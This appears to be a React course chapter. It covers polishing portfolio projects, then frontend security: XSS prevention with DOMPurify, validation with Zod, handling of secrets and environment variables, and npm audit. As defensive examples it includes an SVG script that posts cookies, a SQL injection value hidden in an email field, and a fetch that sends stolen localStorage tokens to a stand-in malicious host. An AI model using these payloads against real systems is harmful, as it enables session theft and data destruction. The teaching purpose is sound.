<!-- h1, h2 already used by CTD Learns -->
### Polishing an App for Your Portfolio

Transforming your course assignments into portfolio-worthy applications requires attention to three critical areas: visual presentation, code quality, and documentation. While your projects may function correctly, potential employers and collaborators will evaluate not just what your app does, but how professionally it's presented, how well it's built, and how clearly it's documented. This section provides a comprehensive checklist to elevate your React applications from course exercises to showcase pieces that demonstrate your growth as a developer and your readiness for professional development work.

#### Styling

Visual presentation is often the first—and sometimes only—impression your application makes on potential employers. While comprehensive documentation is valuable, busy hiring managers reviewing dozens of portfolios may only have time to quickly interact with your live application. Professional styling demonstrates attention to detail, user empathy, and an understanding that great software isn't just functional—it's delightful to use. Your styling choices should reflect current design trends while maintaining accessibility and usability across all devices and user capabilities.

##### Visual Polish

- Consistent color scheme and branding
- Typography hierarchy and readability
- Responsive design across devices
- Loading states and micro-interactions
- Error states and empty states

##### Professional Appearance

- Clean, modern design aesthetics
- Consistent spacing and alignment
- High-quality images and icons
- Smooth animations and transitions

##### User Experience

- Intuitive navigation and flow
- Clear call-to-action buttons
- Feedback for user interactions
- Accessibility compliance (WCAG guidelines: [Web Content Accessibility Guidelines](https://www.w3.org/WAI/WCAG21/quickref/))
- Mobile-first responsive design

##### CSS Best Practices

Since the React curriculum didn't cover CSS styling approaches, this overview introduces popular methods you can use to style React applications professionally. Consider the trade-offs each approach offers in terms of learning curve, performance, and maintainability when choosing your styling strategy.

###### Traditional CSS Approaches

- **Regular CSS files:** Offers simplicity but creates global conflicts and maintenance challenges at scale
  - All CSS classes share the same global namespace, so `.button` in one component can accidentally override `.button` in another
  - As projects grow, developers often unknowingly create duplicate class names that interfere with each other
  - Refactoring becomes risky since changing one CSS rule might break styling in unexpected parts of the application
- **CSS Modules (Recommended):** Provides locally scoped CSS that prevents naming conflicts, making it ideal for component-based architecture
  - Automatically scopes CSS classes to components, solving the global namespace problem
  - Works with existing CSS knowledge and build tools
  - Included by default in Vite's React template, so no additional setup required
  - [CSS Modules Documentation](https://github.com/css-modules/css-modules)

###### CSS-in-JS Libraries

- **Styled-components:** Lets you write CSS directly in JavaScript with component-scoped styles and dynamic theming
  - Eliminates unused CSS, supports props-based styling, and delivers excellent developer experience
  - React community actively supports this popular choice for React applications
  - [Styled-components Documentation](https://styled-components.com/)
- **Emotion:** Provides similar functionality to styled-components but delivers better performance and smaller bundle size
  - Offers both CSS-in-JS and CSS prop approaches to maximize flexibility
  - [Emotion Documentation](https://emotion.sh/)

###### Utility-First Frameworks

- **Tailwind CSS:** Supplies low-level utility classes that enable rapid development through a utility-first approach
  - Features a highly customizable design system with excellent documentation and tooling
  - Promotes consistent spacing, colors, and responsive design patterns
  - [Tailwind CSS Documentation](https://tailwindcss.com/)

###### Component Libraries

- **Material-UI (MUI):** Delivers a complete React component library that implements Google's Material Design
  - Provides pre-built, accessible components with comprehensive theming system
  - [Material-UI Documentation](https://mui.com/)
- **Ant Design:** Focuses on enterprise needs with extensive form and data display components
  - [Ant Design Documentation](https://ant.design/)

###### General Best Practices

- Remove unused CSS and optimize for performance
- Test for cross-browser compatibility across different browsers
- Implement consistent design tokens (colors, spacing, typography)
- Apply responsive design principles for all screen sizes
- Consider accessibility requirements in color contrast and interactive elements

#### Code Cleanliness and Adherence to Best Practices

##### Code Organization and Structure

Building on the project organization principles from Week 6's discussion on organizing files in a React project, ensure your portfolio project maintains a clear, scalable directory structure:

- **`features/`** - Components grouped by functionality
  - Group related components in feature-specific subdirectories
  - Move components to `shared/` when used across multiple features
- **`shared/`** - Reusable components used in multiple features
  - Form components, buttons, modals, and other UI elements
- **`layout/`** - UI organization components (headers, footers, navigation)
  - Components that structure the overall application layout
- **`pages/`** - Page-level components for routing (introduced in Week 10)
  - Top-level components that represent distinct application views
- **`assets/`** - Static resources (images, fonts, icons)
- **`services/`** - Non-React functionality and API integration

##### Naming Conventions, File Organization, and Code Quality

Consistent naming and file organization make your codebase easier to navigate and demonstrates care for your craft. These conventions signal to employers that you write maintainable code and follow industry standards. Clean, production-ready code also demonstrates attention to detail and professional development practices.

- **PascalCase for components:** `ProductCard.jsx`, `TodoForm.jsx`
- **camelCase for functions and variables:** `handleSubmit`, `getUserData`
- **Descriptive, meaningful names:** Avoid abbreviations, use clear intent
- **One component per file:** Component name should match filename exactly
- **Consistent file extensions:** Use `.jsx` for components, `.js` for utilities
- **Remove console.log statements and debug code**
- **Eliminate unused code imports**
- **Consistent error handling patterns**
- **Code comments where necessary (why, not what)**

##### Linting and Formatting

Automated tooling ensures consistent code style and catches potential issues before they become problems. Professional development teams rely on these tools to maintain code quality standards across all contributors.

- ESLint configuration for React best practices
- Prettier for consistent code formatting
- Pre-commit hooks for code quality
- Import organization and cleanup

#### Documentation

Clear documentation demonstrates your ability to communicate technical concepts effectively—a crucial skill employers value. Your documentation should tell the story of your project: what it does, how it works, and why you built it the way you did.

##### README Enhancement

- Clear project description and purpose
- Live demo link and screenshots
- Installation and setup instructions
- How to use the application

**Sample README for CTD Swag:**

````markdown
# CTD Swag - React E-commerce Application

A modern e-commerce application built with React, featuring product browsing, cart management, and user authentication. This project demonstrates proficiency in React hooks, state management, component architecture, and responsive design.

## 🚀 Live Demo
[View Live Application](https://your-deployed-app.netlify.app)

## 📸 Screenshots
![Homepage showing product grid](./screenshots/homepage.png)
![Shopping cart with items](./screenshots/cart.png)

## 🛠️ Technologies Used
- **Frontend:** React 18, React Router, CSS Modules
- **State Management:** useReducer, Context API
- **Build Tool:** Vite
- **Deployment:** Netlify

## ✨ Features
- Browse product catalog with filtering and search
- Add/remove items from shopping cart
- Responsive design for mobile and desktop
- Product detail views with image galleries
- Cart persistence using localStorage
- Checkout process with form validation

## 🏗️ Installation & Setup

1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/ctd-swag.git
   cd ctd-swag
   ```

2. Install dependencies:

   ```bash
   npm install
   ```

3. Start the development server:

   ```bash
   npm run dev
   ```

4. Open [http://localhost:5173](http://localhost:5173) in your browser

````

##### Portfolio-Specific Documentation

Beyond the technical README, your project needs documentation that tells your personal development story. This narrative should live in dedicated sections of your README or as part of your personal website's project showcase. The goal is to help potential employers understand not just what you built, but how you grew as a developer and what you learned from the challenges you faced.

- Technologies learned and applied
- Features and functionality highlights
- Your role and contributions
- Challenges faced and solutions implemented
- Future enhancement ideas

**Example Portfolio Narrative for CTD Swag:**

> **Technologies Learned and Applied:**
>
> Throughout developing CTD Swag, I mastered core React concepts including useState and useEffect hooks, component composition patterns, and prop management. After an MVP was complete, I introduced useReducer for complex cart state management, React Router for multi-page navigation, and performance optimization with useMemo and useCallback hooks. I also gained proficiency in modern development tools including Vite build system, ESLint for code quality, and CSS Modules for component-scoped styling.
>
> **Features and Functionality Highlights:**
>
> - **Dynamic Product Catalog:** Built a responsive product grid with real-time filtering and search capabilities, handling 50+ products with smooth user interactions
> - **Shopping Cart Management:** Implemented full cart functionality including add/remove items, quantity updates, price calculations, and persistent storage across browser sessions
> - **Responsive Design:** Created mobile-first layouts adaptable from 320px mobile screens to 1920px desktop displays
> - **Performance Optimization:** Achieved smooth rendering for large product datasets through strategic memoization and efficient re-render patterns
>
> **Your Role and Contributions:**
>
> As the sole developer on this project, I was responsible for all architectural decisions, component design, and feature implementation. I independently researched and solved complex problems like cart persistence and performance optimization. My key contributions included designing the component hierarchy, implementing the state management strategy, and establishing the file organization structure that scales as the application grows.
>
> **Challenges Faced and Solutions Implemented:**
>
> - **Cart Persistence Challenge:** Cart data was lost on page refresh, creating poor user experience. I researched localStorage APIs and implemented a custom solution using useEffect hooks to automatically sync cart state with browser storage, ensuring data persistence across sessions.
> - **Performance Bottleneck:** Large product lists caused slow rendering and poor user experience. I profiled the application, identified expensive filter operations, and applied memoization techniques that reduced unnecessary re-renders.
> - **Responsive Layout Issues:** Complex product grid layouts broke on mobile devices. I redesigned the CSS using Grid and Flexbox patterns, implementing breakpoint-specific layouts that maintain usability across all screen sizes.
>
> **Future Enhancement Ideas:**
>
> - **User Authentication System:** Implement JWT-based authentication with protected routes for user accounts and order history
> - **Product Reviews Platform:** Integrate a headless CMS to allow customer reviews and ratings with moderation capabilities
> - **Payment Processing:** Add Stripe integration for secure checkout flow with support for multiple payment methods
> - **Inventory Management API:** Build a RESTful backend service with Node.js and MongoDB for dynamic product management and real-time stock updates

#### Summary

Polishing your React applications for portfolio presentation transforms functional projects into compelling professional showcases. **Visual presentation** creates the crucial first impression—professional styling, responsive design, and attention to UI/UX details demonstrate your understanding that great software must be both functional and delightful to use.

**Code quality** establishes your credibility as a developer ready for team environments. Clean organization, consistent naming conventions, and proper tooling integration show employers that you write maintainable code and understand industry standards.

**Documentation** sets you apart by showcasing communication skills that many developers overlook. Clear READMEs and personal development narratives help employers understand not just what you built, but how you think, learn, and solve problems.

Together, these three pillars elevate your course projects from academic exercises to professional portfolio pieces that effectively communicate your growth as a React developer and your readiness for software development roles.

### App and Data Security

Security is a shared responsibility between frontend and backend developers, but React developers must understand their role in protecting user data and preventing common vulnerabilities. While backend systems handle authentication, data validation, and server-side security measures, frontend applications serve as the first line of defense against many attacks and must be designed with security principles in mind.

This section covers security considerations specifically relevant to React developers, organized into three key areas: **Client-Side Security** (areas under direct React developer control), **Application Architecture Security** (frontend implications of security patterns), and **Deployment Concerns** (production environment considerations). Understanding these concepts helps you build applications that protect user data, prevent common attacks, and integrate securely with backend services.

#### Client-Side Security (React Developer Direct Control)

##### XSS (Cross-Site Scripting) Prevention
  
  XSS attacks occur when malicious scripts are injected into trusted websites and executed in users' browsers. These attacks can steal user data, hijack sessions, or perform actions on behalf of users without their consent. React provides built-in protection against most XSS attacks, but developers must understand how to use these protections correctly.

###### JSX Escaping and Safe Practices

  React automatically escapes values embedded in JSX, preventing most XSS attacks by converting potentially dangerous characters into safe HTML entities:

  ```jsx
  // Safe - React automatically escapes the user input
  function UserGreeting({ userName }) {
    return <h1>Welcome, {userName}!</h1>;
  }

  // Even if userName contains "<script>alert('XSS')</script>"
  // React renders it safely as text, not executable code
  ```

  React's automatic escaping works reliably unless you explicitly bypass these protections:

  ```jsx
  // DANGEROUS - Using dangerouslySetInnerHTML with user input
  function UnsafeComponent({ userInput }) {
    // This bypasses React's escaping and enables XSS attacks
    return <div dangerouslySetInnerHTML={{__html: userInput}} />;
  }

  // DANGEROUS - Creating HTML strings manually
  function AlsoUnsafe({ userInput }) {
    const htmlString = `<p>User said: ${userInput}</p>`;
    return <div dangerouslySetInnerHTML={{__html: htmlString}} />;
  }
  ```

###### Safe Use of `dangerouslySetInnerHTML`

  The `dangerouslySetInnerHTML` prop allows you to set HTML directly, but it completely bypasses React's XSS protection. Use it only when absolutely necessary and always sanitize the content first.

  When you must use `dangerouslySetInnerHTML`, be sure to sanitize the content. DOMPurify is a good tool that removes malicious code while preserving safe HTML content. [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

  ```jsx
  // WRONG - Direct user input creates XSS vulnerability
  function BadExample({ userHtml }) {
    return <div dangerouslySetInnerHTML={{__html: userHtml}} />;
  }

  // BETTER - Sanitize HTML content first
  import DOMPurify from 'dompurify';

  function SaferExample({ userHtml }) {
    const sanitizedHtml = DOMPurify.sanitize(userHtml);
    return <div dangerouslySetInnerHTML={{__html: sanitizedHtml}} />;
  }
  ```

###### Legitimate Use Cases for `dangerouslySetInnerHTML`

  While you should avoid `dangerouslySetInnerHTML` in most cases, some scenarios require it:

**Content Management and Rich Text:** When integrating WYSIWYG editors (TinyMCE, Quill) or displaying content from headless CMS systems that store rich text as HTML. Content creators need formatting capabilities that can't be easily recreated with React components:

  ```jsx
  import DOMPurify from 'dompurify';

  function RichTextContent({ cmsContent }) {
    // CMS content might contain: <p><strong>Bold text</strong> and <em>italic</em></p>
    const sanitizedContent = DOMPurify.sanitize(cmsContent);
    return <div dangerouslySetInnerHTML={{__html: sanitizedContent}} />;
  }
  ```

**Code Syntax Highlighting:** Libraries like Prism.js generate HTML with specific classes for syntax highlighting:

  ```jsx
  import DOMPurify from 'dompurify';

  function CodeBlock({ highlightedCode }) {
    // Prism.js output: <span class="token keyword">function</span>
    const sanitizedCode = DOMPurify.sanitize(highlightedCode);
    return <pre dangerouslySetInnerHTML={{__html: sanitizedCode}} />;
  }
  ```

**SVG Icons from Strings:** When working with icon libraries that provide SVG content as strings. **Important:** SVG can contain `<script>` tags and other executable content, making sanitization critical:

  ```jsx
  import DOMPurify from 'dompurify';

  function SvgIcon({ svgString }) {
    // DANGEROUS SVG content might contain malicious code:
    // <svg width="100" height="100">
    //   <circle cx="50" cy="50" r="40" fill="red" />
    //   <script>fetch('/steal-data', { method: 'POST', body: document.cookie });</script>
    //   <foreignObject><iframe src="javascript:alert('XSS')"></iframe></foreignObject>
    // </svg>

    // SAFE - DOMPurify removes script tags and other dangerous elements
    const sanitizedSvg = DOMPurify.sanitize(svgString, { 
      USE_PROFILES: { svg: true, svgFilters: true } 
    });
    // Result: <svg width="100" height="100"><circle cx="50" cy="50" r="40" fill="red"></circle></svg>
    // Script tags and dangerous elements are completely removed
    
    return <span dangerouslySetInnerHTML={{__html: sanitizedSvg}} />;
  }
  ```

###### Input Validation Patterns

  Validate and sanitize user input before processing or storing it. This provides defense in depth beyond React's built-in protections. **Never attempt to manually filter malicious content** - attackers know numerous bypass techniques that manual keyword filtering can't catch.

**Use Established Validation Libraries:**

  Third-party validation libraries like Zod provide comprehensive schema validation that handles complex edge cases and security considerations that manual validation often misses. These libraries are battle-tested and maintained by security-conscious developers. [Zod Documentation](https://zod.dev/)

  ```jsx
  import { z } from 'zod';
  import DOMPurify from 'dompurify';

  // Define validation schema
  const commentSchema = z.object({
    content: z.string()
      .min(3, 'Comment must be at least 3 characters')
      .max(1000, 'Comment must be less than 1000 characters')
      .refine((value) => value.trim().length > 0, 'Comment cannot be empty')
  });

  function CommentForm({ onSubmit }) {
    const [comment, setComment] = useState('');
    const [errors, setErrors] = useState({});
    
    const handleSubmit = (e) => {
      e.preventDefault();
      setErrors({});
      
      try {
        // Validate with established schema
        const validatedData = commentSchema.parse({ content: comment });
        
        // Sanitize content even if it's valid structure
        const sanitizedComment = DOMPurify.sanitize(validatedData.content);
        
        onSubmit(sanitizedComment);
      } catch (error) {
        // Handle validation errors safely
        if (error.errors) {
          const fieldErrors = {};
          error.errors.forEach((err) => {
            fieldErrors[err.path[0]] = err.message;
          });
          setErrors(fieldErrors);
        }
      }
    };

    return (
      <form onSubmit={handleSubmit}>
        <textarea 
          value={comment}
          onChange={(e) => setComment(e.target.value)}
          placeholder="Enter your comment..."
        />
        {errors.content && <p className="error">{errors.content}</p>}
        <button type="submit">Submit</button>
      </form>
    );
  }
  ```

**Server-Side Validation is Critical:**

  Client-side validation serves primarily as a user experience enhancement, providing immediate feedback to help users complete forms correctly. However, it cannot be trusted for security purposes because users have complete control over client-side code. Attackers can easily bypass client-side validation by disabling JavaScript, modifying code in developer tools, or sending HTTP requests directly to your API endpoints.

  Every piece of data your application receives must be validated and sanitized on the server, regardless of client-side checks. This principle applies to all user inputs: form data, URL parameters, file uploads, and API request payloads. Server-side validation acts as your application's security boundary—the final checkpoint that determines whether data is safe to process and store.

  ```jsx
  // Client validation for UX, server validation for security
  function SecureForm({ onSubmit }) {
    const [email, setEmail] = useState('');
    const [serverError, setServerError] = useState('');
    
    const handleSubmit = async (e) => {
      e.preventDefault();
      
      try {
        // Client-side validation for immediate user feedback
        const emailSchema = z.string().email('Please enter a valid email');
        const validEmail = emailSchema.parse(email);
        
        // Server handles final validation and security checks
        const response = await fetch('/api/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: validEmail })
        });
        
        if (!response.ok) {
          const error = await response.json();
          setServerError(error.message || 'Submission failed');
          return;
        }
        
        onSubmit(validEmail);
      } catch (error) {
        setServerError('Please check your input and try again');
      }
    };
    // ... rest of component
  }
  ```

  Even when client-side validation successfully passes, the data may still pose security risks that only server-side validation can prevent. Consider these examples that would pass Zod's email validation but could cause serious problems if not validated on the server:

  **SQL Injection through Email Field:**

  ```jsx
  // This passes client validation: user@domain.com'; DROP TABLE users; --
  // Valid email format, but contains SQL injection payload
  // Server must use parameterized queries to prevent database manipulation
  ```

  **Email Bombing/Resource Exhaustion:**

  ```jsx
  // This passes client validation: user@verylongdomainnamerepeated[...]repeated.com
  // Valid email format, but extremely long (10,000+ characters)
  // Server must enforce length limits to prevent memory exhaustion attacks
  ```

  Server-side validation must implement comprehensive security checks including input sanitization, length limits, rate limiting, parameterized database queries, and business logic validation that goes far beyond basic format checking.

##### Environment Variables and API Keys

  One of the most critical security mistakes React developers make is exposing sensitive information in client-side code. Unlike server-side applications, React apps run entirely in users' browsers, making all code and configuration visible to anyone who inspects the application. This fundamental difference requires careful handling of environment variables and API keys.

###### Understanding Client-Side Exposure

  When Vite builds your React application for production, it bundles all your JavaScript code, including any environment variables or API keys you've included, into files that are downloaded and executed in users' browsers. Anyone can view these files, search through your code, or inspect network requests to discover sensitive information.

  ```jsx
  // DANGEROUS - API key is visible to everyone
  const API_KEY = "sk_live_51H123...real_stripe_key...xyz";

  function PaymentComponent() {
    // This exposes your secret key to all users
    const stripe = Stripe(API_KEY);
    // Users can see this key in their browser's developer tools
    return <div>Payment form</div>;
  }
  ```

  Even if you think you're being clever by obfuscating the key or splitting it across variables, the final bundled code still contains the complete secret. Build tools optimize and bundle your code, but they don't encrypt or hide sensitive values from inspection.

###### Safe Environment Variable Usage in React

  React and Vite provide environment variables for configuration, but only certain variables are exposed to the client-side code. In Vite projects, only environment variables prefixed with `VITE_` are included in the client bundle.

  **Safe for Client-Side (Public Information):**
  
  ```jsx
  // .env file - These values are visible to users
  VITE_API_BASE_URL=https://api.example.com
  VITE_APP_NAME=My React App
  VITE_ENVIRONMENT=production
  VITE_ANALYTICS_ID=GA-123456789
  VITE_PUBLIC_STRIPE_KEY=pk_test_123...  # Public keys are safe
  ```

  ```jsx
  // In your React components - Safe to use
  function App() {
    const apiUrl = import.meta.env.VITE_API_BASE_URL;
    const appName = import.meta.env.VITE_APP_NAME;
    
    // These values are meant to be public
    return <div>Welcome to {appName}</div>;
  }
  ```

  **Never Include in Client-Side Code (Private Secrets):**

  ```jsx
  // .env file - These should NEVER have VITE_ prefix
  DATABASE_URL=postgresql://user:password@localhost/mydb
  JWT_SECRET=super_secret_signing_key_123
  STRIPE_SECRET_KEY=sk_live_51H123...secret_key...xyz
  SENDGRID_API_KEY=SG.abc123...secret...xyz
  ADMIN_PASSWORD=admin123password
  ```

###### Proper Architecture for API Keys

  The secure approach is to keep all secret keys on your backend server and have your React app authenticate with your own API, which then makes authenticated requests to third-party services.

  ```jsx
  // WRONG - Secret key exposed in React code
  function SendEmail({ recipient, message }) {
    const sendEmail = async () => {
      // ⚠️This exposes your SendGrid API key to all users⚠️
      const response = await fetch('https://api.sendgrid.v3/mail/send', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer SG.secret_key_here`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          personalizations: [{ to: [{ email: recipient }] }],
          subject: 'Hello',
          content: [{ type: 'text/plain', value: message }]
        })
      });
    };
    
    return <button onClick={sendEmail}>Send Email</button>;
  }
  ```

  ```jsx
  // CORRECT - React calls your backend, backend holds secrets
  function SendEmail({ recipient, message }) {
    const sendEmail = async () => {
      // React calls your own API endpoint
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          // Include user authentication, not service API keys
          'Authorization': `Bearer ${userAuthToken}`
        },
        body: JSON.stringify({
          recipient,
          message
        })
      });
      
      if (!response.ok) {
        throw new Error('Failed to send email');
      }
    };
    
    return <button onClick={sendEmail}>Send Email</button>;
  }
  ```

  In this secure architecture, your backend API endpoint (`/api/send-email`) handles the actual SendGrid integration using the secret API key stored securely on the server. Your React app only needs to authenticate the user and send the email request to your own backend.

###### Environment Variable Security Best Practices

  **Environment File Types and Loading Priority:**

  Vite supports multiple environment files that are automatically loaded based on the current environment mode and a specific priority order. Understanding this system helps you organize configuration securely and avoid accidentally exposing the wrong values in different environments.

  ```bash
  # File loading priority (highest to lowest):
  .env.local                    # Loaded in all environments (should be in .gitignore)
  .env.[mode].local            # Loaded in specific mode (should be in .gitignore)
  .env.[mode]                  # Loaded in specific mode (should be in .gitignore)
  .env                         # Fallback for all environments (should be in .gitignore)
  ```

  **How Vite Determines Which Files to Load:**

  When you run `npm run dev`, Vite automatically sets the mode to `development` and loads files in this order:

  1. `.env.development.local` (if it exists)
  2. `.env.local` (if it exists)
  3. `.env.development` (if it exists)
  4. `.env` (if it exists)

  When you run `npm run build`, Vite sets the mode to `production` and loads:

  1. `.env.production.local` (if it exists)
  2. `.env.local` (if it exists)
  3. `.env.production` (if it exists)
  4. `.env` (if it exists)

  Variables defined in higher-priority files override those in lower-priority files.

  **Development vs Production Separation:**

  Instead of committing actual environment files, use deployment platform environment variables and provide documentation for local development:

  ```bash
  # .env.development - Development configuration (should be in .gitignore)
  VITE_API_BASE_URL=http://localhost:3000/api
  VITE_ENVIRONMENT=development
  VITE_DEBUG_MODE=true
  VITE_STRIPE_PUBLISHABLE_KEY=pk_test_123...  # Test keys are safe

  # .env.production - Production configuration (should be in .gitignore)
  VITE_API_BASE_URL=https://api.yourapp.com
  VITE_ENVIRONMENT=production
  VITE_DEBUG_MODE=false
  VITE_STRIPE_PUBLISHABLE_KEY=pk_live_123...  # Public keys are safe
  ```

  **Alternative: Use Example Files for Documentation:**

  ```bash
  # .env.example - Template showing required variables (safe to commit)
  VITE_API_BASE_URL=https://your-api-url-here
  VITE_APP_NAME=Your App Name
  VITE_STRIPE_PUBLISHABLE_KEY=pk_test_or_live_key_here
  
  # Include instructions in your README:
  # 1. Copy .env.example to .env
  # 2. Replace placeholder values with your actual configuration
  ```

  **Local Override Files (Never Commit These):**

  ```bash
  # .env.local - Personal overrides for any environment
  VITE_API_BASE_URL=http://192.168.1.100:3000/api  # Personal dev server IP
  VITE_DEBUG_MODE=true  # Personal debugging preference

  # .env.development.local - Personal development overrides
  VITE_API_BASE_URL=http://localhost:8080/api  # Different local port
  VITE_ENABLE_MOCK_DATA=true  # Personal testing flag

  # .env.production.local - Emergency production overrides
  VITE_MAINTENANCE_MODE=true  # Temporary maintenance flag
  ```

  **Deployment Environment Variables:**

  Use your deployment platform's secure environment variable storage instead of committing `.env` files. Most platforms (Netlify, Vercel, Railway) provide secure interfaces for setting environment variables that are injected during the build process. We will cover this more in the Deploying a React App section later on.

###### Common Mistakes to Avoid

  **Thinking Obfuscation Provides Security:**

  ```jsx
  // STILL DANGEROUS - Obfuscation is not security
  const part1 = "sk_live_51H";
  const part2 = "123secret";
  const part3 = "key456";
  const API_KEY = part1 + part2 + part3;
  
  // Users can still find this key by searching the bundled JavaScript
  ```

  **Storing Secrets in localStorage or sessionStorage:**

  ```jsx
  // DANGEROUS - Client-side storage is not secure
  localStorage.setItem('apiKey', 'secret_key_123');
  sessionStorage.setItem('adminPassword', 'admin123');
  
  // Any JavaScript code (including malicious scripts) can access these values
  const storedKey = localStorage.getItem('apiKey');
  ```

  **Including Development Secrets in Production Builds:**

  ```jsx
  // DANGEROUS - Development keys might leak into production
  const isDev = import.meta.env.NODE_ENV === 'development';
  const apiKey = isDev ? 'dev_key_123' : 'prod_key_456';
  
  // Both keys end up in the production bundle
  ```

  The secure approach is to never include secret keys in React code at any stage of development or production. Keep all secrets on your backend server and design your API architecture to protect them.

##### Client-Side Data Storage Security

  React applications frequently need to store data locally in users' browsers. All client-side storage mechanisms are inherently insecure and accessible to any code running in the user's browser. Understanding these limitations is crucial for making safe storage decisions.

###### Understanding Client-Side Storage Vulnerabilities

  All browser storage APIs store data in plain text and can be accessed by any JavaScript code running on your domain, including malicious scripts injected through XSS attacks, browser extensions, or other vulnerabilities.

  ```jsx
  // All of these are visible to any JavaScript code on your domain:
  localStorage.setItem('userToken', 'jwt-token-123');
  sessionStorage.setItem('userId', '12345');
  
  // Malicious scripts can easily access this data:
  const stolenToken = localStorage.getItem('userToken');
  const stolenUserId = sessionStorage.getItem('userId');
  
  // And send it to malicious servers:
  fetch('https://malicious-site.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: stolenToken, userId: stolenUserId })
  });
  ```

###### What Never to Store Client-Side

  **Never store sensitive information in any browser storage:**

  ```jsx
  // DANGEROUS - Never store these client-side:
  localStorage.setItem('password', 'user-password');
  localStorage.setItem('socialSecurityNumber', '123-45-6789');
  localStorage.setItem('creditCardNumber', '4111-1111-1111-1111');
  localStorage.setItem('apiSecret', 'sk_live_secret_key');
  localStorage.setItem('databaseCredentials', 'user:pass@host');
  localStorage.setItem('personalHealthInfo', 'medical-data');
  
  // Also avoid storing complete user profiles with sensitive data:
  localStorage.setItem('userProfile', JSON.stringify({
    name: 'John Doe',
    email: 'john@example.com',
    ssn: '123-45-6789',        // DANGEROUS
    bankAccount: '123456789',   // DANGEROUS
    medicalInfo: 'diabetes'     // DANGEROUS
  }));
  ```

###### Safe Client-Side Storage Patterns

  **Appropriate uses for localStorage and sessionStorage:**

  ```jsx
  // SAFE - Public preferences and non-sensitive data:
  localStorage.setItem('theme', 'dark');
  localStorage.setItem('language', 'en');
  localStorage.setItem('fontSize', 'large');
  
  // SAFE - Temporary UI state:
  sessionStorage.setItem('currentTab', 'profile');
  sessionStorage.setItem('formDraft', JSON.stringify({ title: 'Draft Post' }));
  
  // SAFE - Public cache data (that could be refetched):
  localStorage.setItem('publicProductList', JSON.stringify(products));
  
  // SAFE - Non-sensitive user preferences:
  localStorage.setItem('userPreferences', JSON.stringify({
    notifications: true,
    newsletter: false,
    displayName: 'John'  // Only if not sensitive
  }));
  ```

###### Secure Authentication Token Handling

  While authentication tokens must sometimes be stored client-side, follow these patterns to minimize risk:

  **Short-lived Tokens with Refresh Pattern:**

  ```jsx
  // Store only short-lived access tokens (15-30 minutes)
  localStorage.setItem('accessToken', shortLivedToken);
  
  // Implement automatic refresh before expiration
  function refreshTokenBeforeExpiry() {
    const tokenExpiry = localStorage.getItem('tokenExpiry');
    const now = Date.now();
    
    if (now >= tokenExpiry - 5 * 60 * 1000) { // Refresh 5 min before expiry
      refreshAuthToken();
    }
  }
  
  async function refreshAuthToken() {
    try {
      // Call refresh endpoint (refresh token stored in httpOnly cookie)
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include' // Include httpOnly cookies
      });
      
      const { accessToken, expiresIn } = await response.json();
      
      localStorage.setItem('accessToken', accessToken);
      localStorage.setItem('tokenExpiry', Date.now() + expiresIn * 1000);
    } catch (error) {
      // Redirect to login on refresh failure
      //defined outside example
      redirectToLogin();
    }
  }
  
  // Clear data on logout
  function logout() {
    localStorage.removeItem('accessToken');
    localStorage.removeItem('tokenExpiry');
    sessionStorage.clear();
    // Redirect to login page
    redirectToLogin();
  }
  ```

##### Dependency Vulnerabilities

  React applications rely heavily on third-party packages from npm, making dependency security a critical concern. A single vulnerable package in your dependency tree can compromise your entire application. Modern React projects typically include hundreds of dependencies when you count transitive dependencies (dependencies of your dependencies), creating a large attack surface that requires ongoing management.

###### Understanding the npm Dependency Risk

  Every package in your `node_modules` folder represents potential security risk. Even packages that seem unrelated to security can contain vulnerabilities that affect your application:

  ```bash
  # Your package.json might look simple:
  {
    "dependencies": {
      "react": "^18.2.0",
      "react-router-dom": "^6.8.0",
      "axios": "^1.3.0",
      "date-fns": "^2.29.0"
    }
  }

  # But npm ls reveals hundreds of actual dependencies:
  npm ls --all
  # ├── react@18.2.0
  # │ ├── loose-envify@1.4.0
  # │ │ └── js-tokens@4.0.0
  # │ └── scheduler@0.23.0
  # ├── axios@1.3.0
  # │ ├── follow-redirects@1.15.2  # <-- Could contain vulnerabilities
  # │ ├── form-data@4.0.0
  # │ └── proxy-from-env@1.1.0
  # ... (hundreds more)
  ```

###### Using npm audit for Security Scanning

  npm provides built-in tools to identify known vulnerabilities in your dependency tree. Run these commands regularly as part of your development workflow:

  ```bash
  # Check for vulnerabilities in your project
  npm audit

  # View detailed vulnerability information
  npm audit --audit-level moderate

  # Attempt automatic fixes for fixable vulnerabilities
  npm audit fix

  # Force fixes (use with caution - can break compatibility)
  npm audit fix --force
  ```

  **Understanding npm audit Output:**

  ```bash
  # Example npm audit output:
  found 3 vulnerabilities (1 moderate, 2 high) in 1420 scanned packages
    2 vulnerabilities require semver-major dependency updates.
    1 vulnerability requires manual review. See the full report for details.

  # High severity example:
  ┌──────────────────────────────────────────────────────────────────┐
  │                                Manual Review                     │
  │            Some vulnerabilities require your attention           │
  │     package: follow-redirects                                    │
  │     patched in: >=1.14.8                                        │
  │     severity: high                                              │
  │     via: axios                                                  │
  │     More info: https://github.com/advisories/GHSA-74fj-2j2h-c42q │
  └──────────────────────────────────────────────────────────────────┘
  ```

###### Dependency Update Strategy

  **Regular Update Schedule:**

  Establish a consistent routine for checking and updating dependencies. Weekly or bi-weekly reviews help you stay current with security patches while preventing the accumulation of too many updates at once. Use `npm outdated` to identify packages with newer versions available, then apply updates systematically rather than all at once.

  For routine maintenance, `npm update` safely applies patch and minor version updates that shouldn't introduce breaking changes. When major version updates are available, research the changelog and update one package at a time, allowing you to isolate any issues that arise.

  **Safe Update Practices:**

  Before updating dependencies, ensure you have comprehensive test coverage for your application's critical functionality. This includes testing authentication flows, data fetching and display, form submissions, routing and navigation, and any payment or business logic.

  Always test updates in a staging environment that mirrors your production setup. Have a rollback plan ready in case updates break functionality - this might involve reverting to the previous package-lock.json file or maintaining backup branches.

  After applying updates, validate that all critical user paths still work correctly. Pay special attention to areas where updated packages are heavily used, and monitor your application closely after deploying updated dependencies to production.

###### Package Selection Security Best Practices

  **Evaluating Package Trustworthiness:**

